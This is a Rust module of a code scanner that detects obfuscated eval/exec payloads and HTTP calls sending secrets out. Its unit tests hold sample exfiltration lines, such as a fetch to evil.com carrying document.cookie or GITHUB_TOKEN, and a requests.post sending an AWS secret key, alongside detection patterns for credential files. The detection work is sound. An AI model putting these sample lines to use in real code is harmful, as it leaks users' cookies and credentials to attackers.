use once_cell::sync::Lazy;
use regex::Regex;

use crate::rules::shared::SENSITIVE_KEY_VARS;
use crate::script_analysis::detect_interpreter;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Code file extensions eligible for scanning.
const CODE_EXTENSIONS: &[&str] = &[
    "js", "mjs", "cjs", "ts", "mts", "jsx", "tsx", "py", "pyw", "sh", "bash", "zsh", "fish", "ps1",
    "psm1", "rb", "php", "pl",
];

/// Returns true if the file is a code file that should be scanned.
pub fn is_code_file(path: Option<&str>, content: &str) -> bool {
    if let Some(p) = path {
        let lower = p.to_lowercase();
        if let Some(ext) = lower.rsplit('.').next() {
            if CODE_EXTENSIONS.contains(&ext) {
                return true;
            }
        }
    }
    // Extensionless: require shebang
    if content.starts_with("#!") {
        let interp = detect_interpreter(content);
        if !interp.is_empty() {
            return true;
        }
    }
    false
}

/// Run code file pattern scanning rules.
pub fn check(input: &str, file_path: Option<&str>) -> Vec<Finding> {
    let mut findings = Vec::new();

    check_dynamic_code_execution(input, &mut findings);
    check_obfuscated_payload(input, &mut findings);
    check_suspicious_code_exfiltration(input, file_path, &mut findings);

    findings
}

// ---------------------------------------------------------------------------
// DynamicCodeExecution — eval/exec near decode/obfuscation tokens (~500 chars)
// ---------------------------------------------------------------------------

static DYNAMIC_CODE_PAIRS: Lazy<Vec<(Regex, Regex, &'static str)>> = Lazy::new(|| {
    vec![
        // JS: eval( near atob(
        (
            Regex::new(r"eval\s*\(").unwrap(),
            Regex::new(r"atob\s*\(").unwrap(),
            "eval() near atob()",
        ),
        // JS: eval( near String.fromCharCode
        (
            Regex::new(r"eval\s*\(").unwrap(),
            Regex::new(r"String\.fromCharCode").unwrap(),
            "eval() near String.fromCharCode()",
        ),
        // JS: new Function( near encoded content
        (
            Regex::new(r"new\s+Function\s*\(").unwrap(),
            Regex::new(r"(?:atob|String\.fromCharCode|Buffer\.from)\s*\(").unwrap(),
            "new Function() near encoded content",
        ),
        // Python: exec( near b64decode/base64.b64decode
        (
            Regex::new(r"exec\s*\(").unwrap(),
            Regex::new(r"b(?:ase)?64[._]?b?64decode|b64decode").unwrap(),
            "exec() near b64decode()",
        ),
        // Python: exec(compile(
        (
            Regex::new(r"exec\s*\(\s*compile\s*\(").unwrap(),
            Regex::new(r"compile\s*\(").unwrap(),
            "exec(compile())",
        ),
        // Python: exec(__import__(
        (
            Regex::new(r"exec\s*\(\s*__import__\s*\(").unwrap(),
            Regex::new(r"__import__\s*\(").unwrap(),
            "exec(__import__())",
        ),
    ]
});

const PROXIMITY_WINDOW: usize = 500;

fn check_dynamic_code_execution(input: &str, findings: &mut Vec<Finding>) {
    for (pattern_a, pattern_b, description) in DYNAMIC_CODE_PAIRS.iter() {
        for mat_a in pattern_a.find_iter(input) {
            let start = mat_a.start().saturating_sub(PROXIMITY_WINDOW);
            let end = (mat_a.end() + PROXIMITY_WINDOW).min(input.len());
            let window = &input[start..end];

            if pattern_b.is_match(window) {
                findings.push(Finding {
                    rule_id: RuleId::DynamicCodeExecution,
                    severity: Severity::Medium,
                    title: "Dynamic code execution with obfuscation".to_string(),
                    description: format!("Detected {description} in close proximity"),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: description.to_string(),
                        matched: truncate(
                            &input[mat_a.start()..safe_end(input, mat_a.end() + 80)],
                            120,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return; // One finding per file is enough
            }
        }
    }
}

// ---------------------------------------------------------------------------
// ObfuscatedPayload — long base64 inside decode call near eval/exec
// ---------------------------------------------------------------------------

static OBFUSCATED_DECODE_CALL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?:atob\s*\(\s*["']|b64decode\s*\(\s*b?["']|Buffer\.from\s*\(\s*["'])([A-Za-z0-9+/=]{40,})"#,
    )
    .unwrap()
});

static EXEC_EVAL_NEARBY: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?:eval|exec|Function)\s*\(").unwrap());

fn check_obfuscated_payload(input: &str, findings: &mut Vec<Finding>) {
    for cap in OBFUSCATED_DECODE_CALL.captures_iter(input) {
        let full_match = cap.get(0).unwrap();
        let start = full_match.start().saturating_sub(PROXIMITY_WINDOW);
        let end = (full_match.end() + PROXIMITY_WINDOW).min(input.len());
        let window = &input[start..end];

        if EXEC_EVAL_NEARBY.is_match(window) {
            findings.push(Finding {
                rule_id: RuleId::ObfuscatedPayload,
                severity: Severity::Medium,
                title: "Obfuscated payload with decode-execute".to_string(),
                description:
                    "Long base64 string decoded and executed — likely obfuscated malicious payload"
                        .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "base64 decode + eval/exec".to_string(),
                    matched: truncate(full_match.as_str(), 120),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

// ---------------------------------------------------------------------------
// SuspiciousCodeExfiltration — HTTP call with sensitive data in call args
// ---------------------------------------------------------------------------

/// JS HTTP call patterns — must capture up to the opening `(`
static JS_HTTP_CALL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?:fetch\s*\(|axios\.\w+\s*\(|\.send\s*\()").unwrap());

/// Python HTTP call patterns — must capture up to the opening `(`
static PY_HTTP_CALL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?:requests\.(?:post|get|put)\s*\(|urllib\.request\.\w+\s*\()").unwrap()
});

/// Sensitive JS references: document.cookie or process.env.SENSITIVE_KEY
static JS_SENSITIVE: Lazy<Regex> = Lazy::new(|| {
    let keys: Vec<String> = SENSITIVE_KEY_VARS
        .iter()
        .map(|k| regex::escape(k))
        .collect();
    Regex::new(&format!(
        r"(?:document\.cookie|process\.env\.(?:{}))",
        keys.join("|")
    ))
    .unwrap()
});

/// Sensitive Python references: os.environ["SENSITIVE_KEY"] or open("/etc/passwd")
static PY_SENSITIVE: Lazy<Regex> = Lazy::new(|| {
    let keys: Vec<String> = SENSITIVE_KEY_VARS
        .iter()
        .map(|k| regex::escape(k))
        .collect();
    Regex::new(&format!(
        r#"(?:os\.environ\[["'](?:{})["']\]|open\s*\(\s*["']/etc/(?:passwd|shadow)["'][^)]*\))"#,
        keys.join("|")
    ))
    .unwrap()
});

/// Property keywords that indicate header context (suppress finding).
static HEADER_PROPS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:headers|[Aa]uthorization|[Xx]-[Aa]pi-[Kk]ey)\s*[:=\[{]").unwrap()
});

/// Property keywords that indicate data/send context (do not suppress).
static SEND_PROPS: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)(?:body|data|json|params|payload)\s*[:=]").unwrap());

/// Find the end of a call's argument list by matching the closing delimiter.
/// `open_pos` must point to the character AFTER the opening `(`.
/// Returns the byte position after the matching `)`, or None if unbalanced.
///
/// Handles: nested brackets, string literals (`"`, `'`, `` ` ``),
/// block comments (`/* ... */`), line comments (`//`, `#`), and
/// JS regex literals (heuristic: `/` preceded by a non-value byte).
fn find_call_end(input: &[u8], open_pos: usize) -> Option<usize> {
    let mut depth: u32 = 1;
    let mut i = open_pos;
    let mut in_string: Option<u8> = None;

    while i < input.len() && depth > 0 {
        let b = input[i];
        match in_string {
            Some(q) => {
                if b == b'\\' && i + 1 < input.len() {
                    i += 2; // skip escaped char
                    continue;
                }
                if b == q {
                    in_string = None;
                }
            }
            None => {
                // Block comment: /* ... */
                if b == b'/' && i + 1 < input.len() && input[i + 1] == b'*' {
                    i += 2;
                    while i + 1 < input.len() {
                        if input[i] == b'*' && input[i + 1] == b'/' {
                            i += 2;
                            break;
                        }
                        i += 1;
                    }
                    continue;
                }
                // Line comment: // or #
                if (b == b'/' && i + 1 < input.len() && input[i + 1] == b'/') || b == b'#' {
                    while i < input.len() && input[i] != b'\n' {
                        i += 1;
                    }
                    continue;
                }
                // JS regex literal: / preceded by a non-value token
                // Skip whitespace to find previous significant byte.
                if b == b'/' {
                    let prev = {
                        let mut j = i;
                        while j > 0 && matches!(input[j - 1], b' ' | b'\t' | b'\n' | b'\r') {
                            j -= 1;
                        }
                        if j > 0 {
                            input[j - 1]
                        } else {
                            0
                        }
                    };
                    let is_division =
                        prev.is_ascii_alphanumeric() || matches!(prev, b')' | b']' | b'_' | b'$');
                    if !is_division {
                        i += 1; // skip opening /
                        while i < input.len() && input[i] != b'/' {
                            if input[i] == b'\\' && i + 1 < input.len() {
                                i += 1; // skip escaped char in regex
                            }
                            i += 1;
                        }
                        if i < input.len() {
                            i += 1; // skip closing /
                        }
                        continue;
                    }
                }
                match b {
                    b'"' | b'\'' | b'`' => in_string = Some(b),
                    b'(' | b'[' | b'{' => depth += 1,
                    b')' | b']' | b'}' => depth -= 1,
                    _ => {}
                }
            }
        }
        i += 1;
    }
    if depth == 0 {
        Some(i)
    } else {
        None
    }
}

fn check_suspicious_code_exfiltration(
    input: &str,
    file_path: Option<&str>,
    findings: &mut Vec<Finding>,
) {
    let is_js = file_path
        .map(|p| {
            let lower = p.to_lowercase();
            lower.ends_with(".js")
                || lower.ends_with(".mjs")
                || lower.ends_with(".cjs")
                || lower.ends_with(".ts")
                || lower.ends_with(".mts")
                || lower.ends_with(".jsx")
                || lower.ends_with(".tsx")
        })
        .unwrap_or(false);

    let is_py = file_path
        .map(|p| {
            let lower = p.to_lowercase();
            lower.ends_with(".py") || lower.ends_with(".pyw")
        })
        .unwrap_or(false);

    // For extensionless shebangs, detect from content
    let (is_js, is_py) = if !is_js && !is_py && file_path.is_some() {
        let interp = detect_interpreter(input);
        (
            matches!(interp, "node" | "deno" | "bun"),
            matches!(interp, "python" | "python3" | "python2"),
        )
    } else {
        (is_js, is_py)
    };

    if is_js {
        check_js_exfiltration(input, findings);
    }
    if is_py {
        check_py_exfiltration(input, findings);
    }
}

/// Walk bytes up to `pos` tracking strings, comments, and bracket depth.
/// Returns `(depth, is_code)` at the target position.
fn code_context_at(s: &[u8], pos: usize) -> (i32, bool) {
    let mut depth: i32 = 0;
    let mut in_string: Option<u8> = None;
    let mut i = 0;

    while i < s.len() {
        if i == pos {
            return (depth, in_string.is_none());
        }
        let b = s[i];
        if let Some(q) = in_string {
            if b == b'\\' && i + 1 < s.len() {
                i += 2;
                continue;
            }
            if b == q {
                in_string = None;
            }
            i += 1;
            continue;
        }
        // Block comment
        if b == b'/' && i + 1 < s.len() && s[i + 1] == b'*' {
            i += 2;
            while i + 1 < s.len() {
                if i == pos || i + 1 == pos {
                    return (depth, false);
                }
                if s[i] == b'*' && s[i + 1] == b'/' {
                    i += 2;
                    break;
                }
                i += 1;
            }
            continue;
        }
        // Line comment
        if (b == b'/' && i + 1 < s.len() && s[i + 1] == b'/') || b == b'#' {
            while i < s.len() && s[i] != b'\n' {
                if i == pos {
                    return (depth, false);
                }
                i += 1;
            }
            continue;
        }
        // JS regex literal: / preceded by a non-value token
        if b == b'/' {
            let prev = {
                let mut j = i;
                while j > 0 && matches!(s[j - 1], b' ' | b'\t' | b'\n' | b'\r') {
                    j -= 1;
                }
                if j > 0 {
                    s[j - 1]
                } else {
                    0
                }
            };
            let is_division =
                prev.is_ascii_alphanumeric() || matches!(prev, b')' | b']' | b'_' | b'$');
            if !is_division {
                i += 1; // skip opening /
                while i < s.len() && s[i] != b'/' {
                    if i == pos {
                        return (depth, false);
                    }
                    if s[i] == b'\\' && i + 1 < s.len() {
                        i += 1;
                    }
                    i += 1;
                }
                if i < s.len() {
                    if i == pos {
                        return (depth, false);
                    }
                    i += 1; // skip closing /
                }
                continue;
            }
        }
        match b {
            b'"' | b'\'' | b'`' => in_string = Some(b),
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            _ => {}
        }
        i += 1;
    }
    (depth, in_string.is_none())
}

/// Check if a position within a call arg span is inside a headers property
/// by finding the nearest **shallow, non-comment** property keyword.
///
/// Only keywords at the top-level call argument structure AND in actual code
/// (not inside comments or strings) count. A nested `"headers"` key deeper
/// than depth 1, or a `# headers:` in a comment, is ignored.
fn is_in_header_context_within(arg_span: &str, pos_in_span: usize) -> bool {
    let before = &arg_span[..pos_in_span];
    let bytes = before.as_bytes();

    // Filter: shallow (depth ≤ 1) AND in actual code (not comment/string).
    let is_shallow_code = |m: &regex::Match<'_>| -> bool {
        let (depth, is_code) = code_context_at(bytes, m.start());
        depth <= 1 && is_code
    };

    let last_shallow_header = HEADER_PROPS
        .find_iter(before)
        .filter(is_shallow_code)
        .last()
        .map(|m| m.start());
    let last_shallow_send = SEND_PROPS
        .find_iter(before)
        .filter(is_shallow_code)
        .last()
        .map(|m| m.start());

    match (last_shallow_header, last_shallow_send) {
        // A send keyword is closer to the secret → not in header context
        (Some(h), Some(s)) if s > h => false,
        // A header keyword is closest → in header context
        (Some(_), _) => true,
        // No header keyword at all
        _ => false,
    }
}

fn emit_exfil_finding(findings: &mut Vec<Finding>, call_snippet: &str, sens_str: &str) {
    findings.push(Finding {
        rule_id: RuleId::SuspiciousCodeExfiltration,
        severity: Severity::Medium,
        title: "Suspicious code exfiltration pattern".to_string(),
        description: format!(
            "HTTP call passes sensitive data '{}' as argument — potential data exfiltration",
            sens_str
        ),
        evidence: vec![Evidence::CommandPattern {
            pattern: "sensitive data inside HTTP call arguments".to_string(),
            matched: truncate(call_snippet, 120),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn check_js_exfiltration(input: &str, findings: &mut Vec<Finding>) {
    let bytes = input.as_bytes();
    for http_match in JS_HTTP_CALL.find_iter(input) {
        // Match ends right after '(' — find the matching ')'
        let call_end = match find_call_end(bytes, http_match.end()) {
            Some(end) => end,
            None => continue,
        };
        // The argument span is everything between '(' and ')'
        let arg_span = &input[http_match.end()..call_end.saturating_sub(1)];

        for sens_match in JS_SENSITIVE.find_iter(arg_span) {
            // Suppress if inside a headers property within the call args
            if is_in_header_context_within(arg_span, sens_match.start()) {
                continue;
            }
            let snippet = &input[http_match.start()..call_end.min(input.len())];
            emit_exfil_finding(findings, snippet, sens_match.as_str());
            return;
        }
    }
}

fn check_py_exfiltration(input: &str, findings: &mut Vec<Finding>) {
    let bytes = input.as_bytes();
    for http_match in PY_HTTP_CALL.find_iter(input) {
        let call_end = match find_call_end(bytes, http_match.end()) {
            Some(end) => end,
            None => continue,
        };
        let arg_span = &input[http_match.end()..call_end.saturating_sub(1)];

        for sens_match in PY_SENSITIVE.find_iter(arg_span) {
            if is_in_header_context_within(arg_span, sens_match.start()) {
                continue;
            }
            let snippet = &input[http_match.start()..call_end.min(input.len())];
            emit_exfil_finding(findings, snippet, sens_match.as_str());
            return;
        }
    }
}

/// Find the largest byte index ≤ `target` that falls on a UTF-8 char boundary.
fn safe_end(s: &str, target: usize) -> usize {
    let clamped = target.min(s.len());
    // Walk backwards from clamped until we hit a char boundary
    let mut end = clamped;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    end
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let t: String = s.chars().take(max).collect();
        format!("{t}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_code_file_by_extension() {
        assert!(is_code_file(Some("test.js"), ""));
        assert!(is_code_file(Some("test.py"), ""));
        assert!(is_code_file(Some("test.ts"), ""));
        assert!(is_code_file(Some("test.sh"), ""));
        assert!(is_code_file(Some("test.ps1"), ""));
        assert!(!is_code_file(Some("notes.txt"), ""));
        assert!(!is_code_file(Some("config.json"), ""));
    }

    #[test]
    fn test_is_code_file_shebang() {
        assert!(is_code_file(
            Some("script"),
            "#!/usr/bin/env python3\nimport os"
        ));
        assert!(is_code_file(Some("run"), "#!/bin/bash\necho hi"));
        assert!(!is_code_file(Some("data"), "just some text"));
    }

    #[test]
    fn test_dynamic_code_eval_atob() {
        let input = r#"var x = eval(atob("SGVsbG8gV29ybGQ="));"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
            "eval+atob should fire DynamicCodeExecution"
        );
    }

    #[test]
    fn test_dynamic_code_exec_b64decode() {
        let input = r#"exec(b64decode("SGVsbG8gV29ybGQ="))"#;
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
            "exec+b64decode should fire DynamicCodeExecution"
        );
    }

    #[test]
    fn test_bare_eval_no_fire() {
        let input = "eval(someVar);";
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
            "bare eval should not fire"
        );
    }

    #[test]
    fn test_eval_atob_distant_no_fire() {
        let padding = "x".repeat(600);
        let input = format!("eval(something);\n{padding}\natob('SGVsbG8=');");
        let findings = check(&input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
            "distant eval+atob should not fire"
        );
    }

    #[test]
    fn test_obfuscated_payload() {
        let b64 = "A".repeat(50);
        let input = format!(r#"eval(atob("{b64}"))"#);
        let findings = check(&input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ObfuscatedPayload),
            "long base64 in atob near eval should fire ObfuscatedPayload"
        );
    }

    #[test]
    fn test_exfil_fetch_cookie() {
        let input = r#"fetch("https://evil.com/?d=" + document.cookie)"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "fetch + document.cookie should fire"
        );
    }

    #[test]
    fn test_exfil_fetch_env_token() {
        let input = r#"fetch(url, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "fetch + process.env.GITHUB_TOKEN in body should fire"
        );
    }

    #[test]
    fn test_exfil_auth_header_no_fire() {
        let input = r#"fetch("/api/login", {headers: {"Authorization": "Bearer " + process.env.GITHUB_TOKEN}})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "Authorization header pattern should NOT fire"
        );
    }

    #[test]
    fn test_exfil_python_requests() {
        let input = r#"requests.post(url, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "requests.post + secret env should fire"
        );
    }

    #[test]
    fn test_normal_fetch_no_fire() {
        let input = r#"fetch("/api/data").then(r => r.json())"#;
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "normal fetch should not fire"
        );
    }

    #[test]
    fn test_not_code_file_no_fire() {
        let input = r#"eval(atob("SGVsbG8gV29ybGQ="));"#;
        assert!(!is_code_file(Some("notes.txt"), input));
    }

    #[test]
    fn test_internal_post_body_no_fire() {
        let input = r#"requests.post("https://internal-api.example.com/log", json={"event": "login", "user": username})"#;
        let findings = check(input, Some("test.py"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "internal API POST without sensitive data should not fire"
        );
    }

    #[test]
    fn test_exfil_query_concat_fires() {
        let input = r#"fetch("https://evil.com/c?token=" + process.env.GITHUB_TOKEN)"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "URL query concat with secret should fire"
        );
    }

    // -----------------------------------------------------------------------
    // False-positive boundary: secret must be INSIDE the HTTP call's args
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_separate_statement_no_fire() {
        // Secret in a separate statement, not passed to the fetch call
        let input = r#"fetch(url); const payload = { token: process.env.GITHUB_TOKEN };"#;
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "secret in separate statement (not in call args) should NOT fire"
        );
    }

    #[test]
    fn test_exfil_unrelated_body_object_no_fire() {
        // body: keyword exists nearby but belongs to unrelated local object
        let input = r#"fetch(url); const opts = { body: bodyVar }; const token = process.env.GITHUB_TOKEN;"#;
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "unrelated body object near fetch should NOT fire"
        );
    }

    #[test]
    fn test_exfil_document_cookie_not_sent_no_fire() {
        // document.cookie is read but not passed as argument to the fetch call
        let input = r#"fetch(url); console.log(document.cookie);"#;
        let findings = check(input, Some("test.js"));
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "document.cookie outside call args should NOT fire"
        );
    }

    #[test]
    fn test_exfil_document_cookie_inside_call_fires() {
        // document.cookie IS passed inside the fetch call's args
        let input = r#"fetch("https://evil.com/?c=" + document.cookie)"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "document.cookie inside call args should fire"
        );
    }

    // -----------------------------------------------------------------------
    // Parser edge cases: comments and regex literals inside call args
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_block_comment_in_args() {
        // `)` inside a block comment must not terminate the arg span
        let input =
            r#"fetch(url /* ) */, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "block comment with ) inside call args should not break parser"
        );
    }

    #[test]
    fn test_exfil_python_line_comment_in_args() {
        // `#` line comment with `)` must not terminate the arg span
        let input = "requests.post(url, # )\n    data=os.environ[\"AWS_SECRET_ACCESS_KEY\"])";
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "Python # comment with ) inside call args should not break parser"
        );
    }

    #[test]
    fn test_exfil_js_regex_literal_in_args() {
        // regex literal /\(/ must not throw off delimiter counting
        let input = r#"fetch(url, {body: /\(/, json: process.env.GITHUB_TOKEN})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "JS regex literal with ( should not break parser"
        );
    }

    #[test]
    fn test_find_call_end_block_comment() {
        let input = b"url /* ) */, data)";
        assert_eq!(find_call_end(input, 0), Some(18));
    }

    #[test]
    fn test_find_call_end_line_comment() {
        let input = b"url, # )\n    data)";
        assert_eq!(find_call_end(input, 0), Some(18));
    }

    #[test]
    fn test_find_call_end_regex_literal() {
        let input = br#"url, {body: /\(/, val})"#;
        assert_eq!(find_call_end(input, 0), Some(23));
    }

    // -----------------------------------------------------------------------
    // Header suppression: headers before body must not suppress body secrets
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_headers_then_body_fires() {
        let input = r#"fetch(url, {headers: {Authorization: auth}, body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "secret in body after headers in same call should fire"
        );
    }

    #[test]
    fn test_exfil_python_headers_then_data_fires() {
        let input =
            r#"requests.post(url, headers=headers, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "secret in data= after headers= in same call should fire"
        );
    }

    // -----------------------------------------------------------------------
    // Division inside call args must not truncate the span
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_division_in_args_fires() {
        let input = r#"fetch(url, {body: 1 / 2, json: process.env.GITHUB_TOKEN})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "division operator in call args should not break parser"
        );
    }

    #[test]
    fn test_exfil_paren_division_in_args_fires() {
        let input = r#"fetch(url, {body: (a / b), json: process.env.GITHUB_TOKEN})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "parenthesized division in call args should not break parser"
        );
    }

    #[test]
    fn test_find_call_end_division() {
        let input = b"url, {body: 1 / 2, val})";
        assert_eq!(find_call_end(input, 0), Some(24));
    }

    // -----------------------------------------------------------------------
    // Nested "headers" key inside body/data/json must NOT suppress
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_nested_headers_in_body_fires() {
        let input = r#"fetch(url, {body: JSON.stringify({headers: "x", token: process.env.GITHUB_TOKEN})})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "nested 'headers' key inside body payload should NOT suppress"
        );
    }

    #[test]
    fn test_exfil_python_nested_headers_in_data_fires() {
        let input = r#"requests.post(url, data={"headers": "x", "token": os.environ["AWS_SECRET_ACCESS_KEY"]})"#;
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "nested 'headers' key inside data= dict should NOT suppress"
        );
    }

    #[test]
    fn test_exfil_nested_headers_in_json_fires() {
        let input = r#"fetch(url, {json: {headers: "x", token: process.env.GITHUB_TOKEN}})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "nested 'headers' key inside json property should NOT suppress"
        );
    }

    // -----------------------------------------------------------------------
    // Commented-out "headers" keyword must not suppress real data exfil
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_python_hash_comment_headers_fires() {
        let input = "requests.post(url, data={# headers: fake\n'token': os.environ[\"AWS_SECRET_ACCESS_KEY\"]})";
        let findings = check(input, Some("test.py"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "# headers: inside comment must NOT suppress data= exfil"
        );
    }

    #[test]
    fn test_exfil_js_block_comment_headers_fires() {
        let input =
            r#"fetch(url, {/* headers: */ body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "/* headers: */ inside comment must NOT suppress body exfil"
        );
    }

    #[test]
    fn test_exfil_regex_literal_headers_fires() {
        let input = r#"fetch(url, {body: /headers: \{/, json: process.env.GITHUB_TOKEN})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "/headers: .../ inside regex literal must NOT suppress"
        );
    }

    #[test]
    fn test_exfil_regex_literal_authorization_fires() {
        let input = r#"fetch(url, {body: /Authorization: \[/, json: process.env.GITHUB_TOKEN})"#;
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "/Authorization: .../ inside regex literal must NOT suppress"
        );
    }

    // -----------------------------------------------------------------------
    // Division across newlines must not truncate call span
    // -----------------------------------------------------------------------

    #[test]
    fn test_exfil_multiline_division_fires() {
        let input = "fetch(url, {body: 1\n/ 2, json: process.env.GITHUB_TOKEN})";
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "multiline division should not break parser"
        );
    }

    #[test]
    fn test_exfil_multiline_paren_division_fires() {
        let input = "fetch(url, {body: (a\n/ b), json: process.env.GITHUB_TOKEN})";
        let findings = check(input, Some("test.js"));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
            "parenthesized multiline division should not break parser"
        );
    }

    #[test]
    fn test_find_call_end_multiline_division() {
        let input = b"url, {body: 1\n/ 2, val})";
        assert_eq!(find_call_end(input, 0), Some(24));
    }
}
